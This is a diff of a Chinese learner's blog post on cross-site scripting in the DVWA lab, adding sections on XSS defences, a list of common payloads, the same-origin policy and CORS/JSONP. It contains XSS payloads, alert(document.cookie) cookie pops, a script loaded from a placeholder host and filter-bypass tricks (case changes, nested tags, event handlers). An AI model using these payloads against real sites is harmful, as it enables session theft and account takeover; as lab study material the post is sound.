@@ -65,8 +65,9 @@
 <meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/37.png">
 <meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/38.png">
 <meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/39.png">
+<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/40.png">
 <meta property="article:published_time" content="2025-07-01T07:20:42.000Z">
-<meta property="article:modified_time" content="2025-07-02T08:55:47.294Z">
+<meta property="article:modified_time" content="2025-07-04T07:53:30.161Z">
 <meta property="article:author" content="zh1yu">
 <meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
@@ -230,7 +231,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-07-02 16:55:47" itemprop="dateModified" datetime="2025-07-02T16:55:47+08:00">2025-07-02</time>
+                <time title="修改时间：2025-07-04 15:53:30" itemprop="dateModified" datetime="2025-07-04T15:53:30+08:00">2025-07-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -355,7 +356,7 @@
 </div>
 <h3 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h3><p><strong>以下所有标签的 &gt; 都可以用 // 代替,例如 &lt; script&gt; alert(1) &lt;/script//</strong></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签是最直接的XSS有效载荷, 脚本标记可以引用外部的JavaScript代码,也可以将代码插入脚本标记中</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">	-----------------------------</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">	 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span></span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   #弹出hello</span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/hello/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   #弹出hello</span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>        #弹出1,对于数字可以不用引号</span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>      #document 是 浏览器提供的全局 JavaScript 对象,可以弹出cookie</span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx.com/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  #引用外部的xss</span><br><span class="line">	------------------------------</span><br><span class="line"> <span class="tag">&lt;<span class="name">svg</span>&gt;</span>标签：</span><br><span class="line">	------------------------------</span><br><span class="line">	 <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>//		</span></span><br><span class="line"><span class="tag">	<span class="attr">------------------------------</span></span></span><br><span class="line"><span class="tag"> &lt;<span class="attr">img</span>&gt;</span>标签：</span><br><span class="line">	------------------------------</span><br><span class="line">	 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span>  #弹出cookie</span><br><span class="line">	------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>标签：</span><br><span class="line">	------------------------------</span><br><span class="line">	 <span class="tag">&lt;<span class="name">body</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">body</span> <span class="attr">οnpageshοw</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">	------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span>标签：</span><br><span class="line">	------------------------------</span><br><span class="line">	 <span class="tag">&lt;<span class="name">video</span> <span class="attr">οnlοadstart</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span></span><br><span class="line">	------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">Style</span>&gt;</span><span class="language-xml">标签：</span></span><br><span class="line"><span class="language-xml">	------------------------------</span></span><br><span class="line"><span class="language-xml">	 <span class="tag">&lt;<span class="name">style</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	------------------------------</span><br></pre></td></tr></table></figure>
-<h3 id="XSS漏洞的挖掘"><a href="#XSS漏洞的挖掘" class="headerlink" title="XSS漏洞的挖掘"></a>XSS漏洞的挖掘</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">黑盒测试：</span><br><span class="line">	 尽可能找到一切用户可控并且能够输出在页面代码中的地方,比如下面这些：</span><br><span class="line">	 *URL的每一个参数</span><br><span class="line">	 *URL本身</span><br><span class="line">	 *表单</span><br><span class="line">	 *搜索框</span><br><span class="line">---------------------</span><br><span class="line"> 常见业务场景：</span><br><span class="line">	 *重灾区：评论区、留言区、个人信息、订单信息等</span><br><span class="line">	 *针对型：站内信、网页即时通讯、私信、意见反馈</span><br><span class="line">	 *存在风险：搜索框、当前目录、图片属性等</span><br><span class="line">----------------------</span><br><span class="line"> 白盒测试(代码审计)：</span><br><span class="line">	 关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手：</span><br><span class="line">		 PHP中常见的接受参数$_GET、$_POST、$_REQUEST等,可以搜索所有接受参数的</span><br><span class="line">	 地方,然后对收到的数据进行跟踪,看看有没有输出到页面中,然后看输出到页面的</span><br><span class="line">	 数据是否进行了过滤和编码等处理。</span><br><span class="line">	     也可以搜索类似echo这样的输出语句,跟踪输出的变量是从哪里来的,我们能否</span><br><span class="line">	 控制,如果从数据库中取的,是否控制存到数据库中的数据,存到数据之前有没有进</span><br><span class="line">	 行过滤等。</span><br><span class="line">	     大多数程序会对接受参数封装在公共文件的函数中同一调用,我们就要审计这些</span><br><span class="line">	 公共函数看看有没有过滤,能否绕过等。</span><br><span class="line">	 同理审计DOM-XSS可以搜索一些js操作DOM元素的关键字进行审计。</span><br></pre></td></tr></table></figure>
+<h3 id="XSS漏洞的挖掘"><a href="#XSS漏洞的挖掘" class="headerlink" title="XSS漏洞的挖掘"></a>XSS漏洞的挖掘</h3><p>一般情况下，反射型XSS在搜索框啊，或者是页面跳转啊这些地方，而存储型XSS一般是留言，或者用户存储的地方，而DOM呢？是在DOM位置上，不取决于输入环境上。</p>
 <h3 id="XSS的简单绕过滤和绕过"><a href="#XSS的简单绕过滤和绕过" class="headerlink" title="XSS的简单绕过滤和绕过"></a>XSS的简单绕过滤和绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.区分大小写过滤标签：</span><br><span class="line">	  过滤：$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">/&quot;,&quot;&quot;,$name);      //过滤<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">			$name=<span class="title function_">preg_replace</span>(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,$name);   <span class="comment">//过滤</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	  绕过：可以使用大小写绕过  <span class="tag">&lt;<span class="name">scripT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">scripT</span>&gt;</span></span><br><span class="line">----------------------------------</span><br><span class="line"> 2.不区分大小写过滤标签：/i：不区分大小写</span><br><span class="line">	  过滤：$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">/i&quot;,&quot;&quot;,$name);    //不区分大小写过滤 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">			$name=<span class="title function_">preg_replace</span>(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,$name);  <span class="comment">//不区分大小写过滤 </span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	  绕过：可以使用嵌套的script标签绕过：&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)&lt;/scr</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>ipt&gt;</span><br><span class="line">---------------------------------- </span><br><span class="line"> 3.不区分大小写,过滤之间的所有内容：</span><br><span class="line">	  过滤：$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); //过滤了<span class="tag">&lt;<span class="name">script</span>  <span class="attr">及其之间的所有内容</span></span></span><br><span class="line"><span class="tag">	  <span class="attr">绕过</span>：<span class="attr">虽然无法使用</span>&lt;<span class="attr">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签注入XSS代码,但是可以通过img、body等标签的事件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			或者iframe等标签的 rc注入恶意的js代码。</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">οnerrοr</span>=<span class="string">alert(</span>&#x27;<span class="attr">hack</span>&#x27;)&gt;</span> </span></span></span><br></pre></td></tr></table></figure>
 <h1 id="dvwa"><a href="#dvwa" class="headerlink" title="dvwa"></a>dvwa</h1><h2 id="Reflected型xss"><a href="#Reflected型xss" class="headerlink" title="Reflected型xss"></a>Reflected型xss</h2><h3 id="low："><a href="#low：" class="headerlink" title="low："></a>low：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;x&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="3.png" alt="图片"></p>
@@ -487,6 +488,15 @@
 <p>其实还有一种方法，也是主动去闭合，我们看到我们写入的语句被单引号包括，如果我们主动闭合左单引号，紧接一个分号，那么当前js语句就终止了</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">&#x27;;alert(1);//</span></span><br></pre></td></tr></table></figure>
 <p><code>&lt;img&gt;</code> 是 HTML 标签，需插入到 DOM 后才会被解析。直接写在 <code>&lt;script&gt;</code> 中会被视为无效语法。</p>
+<h1 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h1><ul>
+<li>设置关键词黑名单：包括<code>” ‘ ”,” “ ”,”&lt;”,”&gt;” “on*”</code>等非法字符。</li>
+<li>设置http-only：只要 cookie 中含有 Http-only 字段，那么任何 JavaScript 脚本都没有权限读取这条 cookie 的内容</li>
+<li>使用html实体编码等</li>
+<li>SOP同源策略：SOP把拥有相同主机名 、协议和端口的页面视为同一来源。不同来源的资源之间交互是受到限制的。</li>
+</ul>
+<h1 id="xss常用Payload"><a href="#xss常用Payload" class="headerlink" title="xss常用Payload"></a>xss常用Payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. &#x27;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">2. &#x27;&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">3. &#x27;&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">4. &#x27;&quot;&gt;&lt;a href=javascript:alert(1)&gt;  超链接绕过</span><br><span class="line">5. javascript:alert(1)  unicode编码绕过 xss-labs 8</span><br><span class="line">5. &#x27;&quot;&gt;&lt;details open ontoggle= confirm(document[`coo`+`kie`])&gt;</span><br><span class="line">6. onclick=&#x27;alert(1)  事件绕过，不需要闭合</span><br><span class="line">7. 针对script可以大小写和双写绕过</span><br></pre></td></tr></table></figure>
+<p><strong>实际场景中：一般情况下，反射型XSS在搜索框啊，或者是页面跳转啊这些地方，而存储型XSS一般是留言，或者用户存储的地方，而DOM呢？是在DOM位置上，不取决于输入环境上。</strong></p>
+<p><strong>大多反射型都需要去闭合前面的标签（我们可以用上面的payload），存储和dom型可能不需要</strong></p>
 <h1 id="js学习"><a href="#js学习" class="headerlink" title="js学习"></a>js学习</h1><p>JavaScript（JS）是一种多用途的脚本语言，主要用于 <strong>网页交互</strong> 和 <strong>应用开发</strong></p>
 <p><code>&lt;script&gt;</code>元素用于嵌入可执行代码或数据，这通常用作嵌入或者引用 JavaScript 代码，所以在<code>&lt;script&gt;</code>标签中输入<code>&lt;image&gt;&lt;svg&gt;&lt;body&gt;</code>等常规html标签都是无效的</p>
 <p>js在html中两种使用方式：</p>
@@ -534,12 +544,199 @@
 </tbody>
 </table>
 </div>
+<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同源策略是浏览器实施的一种安全机制，它限制了一个源的文档或脚本如何与另一个源的资源进行交互。</p>
+<p><strong>同源的定义</strong>：两个URL在以下三个方面完全相同：</p>
+<ol>
+<li>协议相同（http/https）</li>
+<li>域名相同（包括子域名）</li>
+<li>端口号相同</li>
+</ol>
+<p>以 <code>http://www.example.com/dir/page.html</code>为例：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>对比URL</th>
+<th>结果</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>http://www.example.com/dir/page2.html</code></td>
+<td>同源</td>
+<td>相同的协议，主机，端口</td>
+</tr>
+<tr>
+<td><code>http://www.example.com/dir2/other.html</code></td>
+<td>同源</td>
+<td>相同的协议，主机，端口</td>
+</tr>
+<tr>
+<td><code>http://username:password@www.example.com/dir2/other.html</code></td>
+<td>同源</td>
+<td>相同的协议，主机，端口</td>
+</tr>
+<tr>
+<td><code>http://www.example.com:81/dir/other.html</code></td>
+<td>不同源</td>
+<td>相同的协议，主机，端口不同</td>
+</tr>
+<tr>
+<td><code>https://www.example.com/dir/other.html</code></td>
+<td>不同源</td>
+<td>协议不同</td>
+</tr>
+<tr>
+<td><code>http://en.example.com/dir/other.html</code></td>
+<td>不同源</td>
+<td>不同主机</td>
+</tr>
+<tr>
+<td><code>http://example.com/dir/other.html</code></td>
+<td>不同源</td>
+<td>不同主机(需要精确匹配)</td>
+</tr>
+<tr>
+<td><code>http://v2.www.example.com/dir/other.html</code></td>
+<td>不同源</td>
+<td>不同主机(需要精确匹配)</td>
+</tr>
+<tr>
+<td><code>http://www.example.com:80/dir/other.html</code></td>
+<td>看情况</td>
+<td>端口明确，依赖浏览器实现</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><strong>有同源策略</strong>：就像每家商店有自己的门禁系统，小偷需要分别突破</li>
+<li><strong>没有同源策略</strong>：所有商店共用同一把钥匙，突破一家等于突破所有</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>攻击方式</th>
+<th>是否需要银行有XSS？</th>
+<th>是否依赖同源策略？</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>XSS攻击</strong></td>
+<td>✅ 需要</td>
+<td>❌ 不依赖（XSS是同源攻击）</td>
+</tr>
+<tr>
+<td><strong>无同源策略的跨域AJAX</strong></td>
+<td>❌ 不需要</td>
+<td>✅ 依赖（无SOP才能跨域）</td>
+</tr>
+<tr>
+<td><strong>CSRF（跨站请求伪造）</strong></td>
+<td>❌ 不需要</td>
+<td>✅ 依赖（SOP限制部分CSRF）</td>
+</tr>
+<tr>
+<td><strong>直接读取DOM/Cookie</strong></td>
+<td>❌ 不需要</td>
+<td>✅ 依赖（SOP阻止跨域访问）</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><img src="40.png" alt="图片"></p>
+<h1 id="跨域请求"><a href="#跨域请求" class="headerlink" title="跨域请求"></a>跨域请求</h1><p>当请求的目标URL与当前页面的源不同时，就发生了跨域请求。浏览器会阻止这类请求的响应，除非服务器明确允许。</p>
+<p><strong>跨域请求示例</strong>：假设当前页面URL是 <code>http://www.example.com/index.html</code>，以下请求会被视为跨域：</p>
+<ol>
+<li>向 <code>https://www.example.com/api</code> 发送AJAX请求<ul>
+<li>原因：协议不同（http vs https）</li>
+</ul>
+</li>
+<li>向 <code>http://api.example.com/data</code> 获取数据<ul>
+<li>原因：域名不同（www vs api子域名）</li>
+</ul>
+</li>
+<li>向 <code>http://www.example.com:8080/service</code> 请求服务<ul>
+<li>原因：端口不同（80 vs 8080）</li>
+</ul>
+</li>
+<li>向 <code>http://anotherdomain.com/resource</code> 获取资源<ul>
+<li>原因：完全不同的域名</li>
+</ul>
+</li>
+</ol>
+<h2 id="解决跨域问题的方法"><a href="#解决跨域问题的方法" class="headerlink" title="解决跨域问题的方法"></a>解决跨域问题的方法</h2><h4 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS (跨域资源共享)"></a><strong>CORS</strong> (跨域资源共享)</h4><p><strong>案例背景：</strong>小明在开发了一个A网站（用来记录本公司的设备信息），访问地址是<a target="_blank" rel="noopener" href="https://www.a.com，需要使用ajax请求**B服务器**上的数据，但是又苦于同源策略的限制">https://www.a.com，需要使用ajax请求**B服务器**上的数据，但是又苦于同源策略的限制</a>……  后来找到了一种解决方法<strong>CORS</strong></p>
+<p><strong>基本流程</strong></p>
+<ol>
+<li><strong>浏览器检测到跨域请求</strong>：当A网站的JavaScript尝试向B服务器发送AJAX请求时</li>
+<li><strong>自动添加Origin头</strong>：浏览器自动在请求头中添加<code>Origin: https://www.a.com</code></li>
+<li><strong>服务器响应CORS头</strong>：B服务器需要在响应中包含特定的CORS头</li>
+<li><strong>浏览器检查响应头</strong>：浏览器验证响应头是否允许当前源访问</li>
+<li><strong>允许/阻止请求</strong>：根据验证结果决定是否让前端代码访问响应数据</li>
+</ol>
+<p><strong>最推荐的标准解决方案</strong>，需要后端配合设置响应头：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: <span class="attr">https</span>:<span class="comment">//yourdomain.com  // 或 * (不推荐)</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Methods</span>: <span class="variable constant_">GET</span>, <span class="variable constant_">POST</span>, <span class="variable constant_">PUT</span>, <span class="variable constant_">DELETE</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Headers</span>: <span class="title class_">Content</span>-<span class="title class_">Type</span>, <span class="title class_">Authorization</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Credentials</span>: <span class="literal">true</span>  <span class="comment">// 如需携带cookie</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Max</span>-<span class="title class_">Age</span>: <span class="number">86400</span>  <span class="comment">// 预检请求缓存时间(秒)</span></span><br></pre></td></tr></table></figure>
+<h4 id="JSONP-仅限GET请求"><a href="#JSONP-仅限GET请求" class="headerlink" title="JSONP (仅限GET请求)"></a><strong>JSONP</strong> (仅限GET请求)</h4><p>JSONP（JSON with Padding）是一种早期解决跨域问题的技术，它利用<code>&lt;script&gt;</code>标签不受同源策略限制的特性来实现跨域数据获取。</p>
+<p><strong>核心特点</strong></p>
+<ul>
+<li><strong>仅支持GET请求</strong>：这是其最大限制</li>
+<li><strong>无需服务器特殊配置</strong>：不像CORS需要服务器设置响应头</li>
+<li><strong>逐渐被淘汰</strong>：现代开发推荐使用CORS</li>
+</ul>
+<p><strong>JSON、JSONP的区别：</strong><br>    1、JSON返回的是一串数据、JSONP返回的是脚本代码(包含一个函数调用)<br>    2、JSONP 只支持get请求、不支持post请求 </p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">其余方法</th>
+<th style="text-align:center">原理</th>
+<th style="text-align:center">实现方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">代理服务器</td>
+<td style="text-align:center">通过同源服务器中转请求</td>
+<td style="text-align:center">Nginx反向代理 ，Node.js中间层代理 ，开发服务器代理</td>
+</tr>
+<tr>
+<td style="text-align:center">document.domain</td>
+<td style="text-align:center">修改document.domain实现子域间通信</td>
+<td style="text-align:center">设置相同父域 ：如<code>document.domain = &quot;example.com&quot;</code></td>
+</tr>
+<tr>
+<td style="text-align:center">图像ping</td>
+<td style="text-align:center">利用<code>&lt;img&gt;</code>标签发送简单请求</td>
+<td style="text-align:center">动态创建<code>&lt;img&gt;</code>标签，设置src为目标URL</td>
+</tr>
+<tr>
+<td style="text-align:center">WebSocket</td>
+<td style="text-align:center">基于TCP的全双工通信协议</td>
+<td style="text-align:center">建立WebSocket连接，通过该连接进行双向通信</td>
+</tr>
+<tr>
+<td style="text-align:center">postMessage API</td>
+<td style="text-align:center">HTML5提供的跨文档通信API</td>
+<td style="text-align:center">发送方调用<code>targetWindow.postMessage()</code> 接收方监听<code>message</code>事件</td>
+</tr>
+<tr>
+<td style="text-align:center">window.name</td>
+<td style="text-align:center">利用window.name在不同页面间传递数据</td>
+<td style="text-align:center">设置iframe的window.name， 跳转到同源页面后读取</td>
+</tr>
+</tbody>
+</table>
+</div>
 <p>因为初次学习，所以参考了许多博主的blog：</p>
 <p><strong>参考文章：</strong></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40950781/article/details/100007103">https://blog.csdn.net/weixin_40950781/article/details/100007103</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/heiwa-0924/p/12520547.html">https://www.cnblogs.com/heiwa-0924/p/12520547.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/253523.html">https://www.freebuf.com/articles/web/253523.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/124747885">https://blog.csdn.net/m0_46467017/article/details/124747885</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/102917690">https://blog.csdn.net/bylfsj/article/details/102917690</a></p>
 
     </div>
 
@@ -640,7 +837,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">xss介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="nav-number">1.0.1.</span> <span class="nav-text">xss存在的原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">1.0.2.</span> <span class="nav-text">xss的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%EF%BC%88Persistent-XSS%EF%BC%89"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">存储型XSS（Persistent XSS）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88Reflected-Cross-Site-Scripting%EF%BC%89"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">反射型XSS（Reflected Cross-Site Scripting）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM%E5%9E%8BXSS%EF%BC%88Document-Object-Model-based-XSS%EF%BC%89"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">DOM型XSS（Document Object Model-based XSS）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E7%A7%8Dxss%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="nav-number">1.0.3.</span> <span class="nav-text">三种xss区别：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%9A%84%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="nav-number">1.0.4.</span> <span class="nav-text">XSS的攻击载荷</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98"><span class="nav-number">1.0.5.</span> <span class="nav-text">XSS漏洞的挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E6%BB%A4%E5%92%8C%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.6.</span> <span class="nav-text">XSS的简单绕过滤和绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dvwa"><span class="nav-number">2.</span> <span class="nav-text">dvwa</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reflected%E5%9E%8Bxss"><span class="nav-number">2.1.</span> <span class="nav-text">Reflected型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#low%EF%BC%9A"><span class="nav-number">2.1.1.</span> <span class="nav-text">low：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A"><span class="nav-number">2.1.2.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A"><span class="nav-number">2.1.3.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible-%EF%BC%9A"><span class="nav-number">2.1.4.</span> <span class="nav-text">impossible ：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Store%E5%9E%8BXSS"><span class="nav-number">2.2.</span> <span class="nav-text">Store型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#medium%EF%BC%9A-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">medium：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high%EF%BC%9A-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">high：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#impossible%EF%BC%9A"><span class="nav-number">2.2.3.</span> <span 